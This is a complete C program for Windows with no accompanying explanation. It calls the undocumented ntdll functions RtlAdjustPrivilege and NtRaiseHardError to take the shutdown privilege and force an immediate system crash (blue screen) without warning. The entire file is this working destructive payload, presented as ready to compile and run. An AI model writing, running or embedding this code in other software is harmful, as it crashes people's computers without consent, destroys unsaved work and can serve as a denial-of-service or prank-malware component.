#include <windows.h>
#include <winternl.h>

const ULONG SE_SHUTDOWN_PRIVILEGE = 19;

typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(
    NTSTATUS ErrorStatus, ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters,
    ULONG ResponseOption, PULONG Response);

typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege,
                                                 BOOLEAN Enable,
                                                 BOOLEAN CurrentThread,
                                                 PBOOLEAN Enabled);

#define CallLibraryFunction(module, name, type, ...) \
  ((type)(GetProcAddress(module, name)))(__VA_ARGS__)

int main() {
  BOOLEAN bEnabled;
  ULONG uResp;

  HMODULE ntdll = LoadLibrary("ntdll.dll");

  CallLibraryFunction(ntdll, "RtlAdjustPrivilege", pdef_RtlAdjustPrivilege,
                      SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bEnabled);

  CallLibraryFunction(ntdll, "NtRaiseHardError", pdef_NtRaiseHardError,
                      STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);

  return 0;
}
